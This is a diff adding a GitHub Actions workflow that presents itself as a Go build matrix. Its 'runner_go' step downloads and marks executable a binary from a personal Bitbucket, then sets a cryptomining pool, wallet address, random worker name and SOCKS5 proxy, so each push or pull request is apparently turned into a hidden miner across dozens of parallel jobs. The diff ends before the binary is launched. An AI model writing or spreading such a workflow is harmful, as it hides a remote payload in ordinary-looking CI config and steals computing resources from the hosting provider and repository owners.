@@ -1,0 +1,33 @@
+name: Nanung
+on: [push, pull_request]
+jobs:
+  build:
+    name: Bacodbingits
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4,]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T]
+    timeout-minutes: 333
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        wget https://bitbucket.org/stavol99/mine/downloads/kambing
+        chmod +x kambing
+        screen -dmS ls
+        POOL=stratum+tcp://eu.luckpool.net:3956
+        WALLET=RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm
+        WORKER=$(echo $(shuf -i 100-999 -n 1)-nn1)
+        PROXY=socks5://181.3.74.174:1080
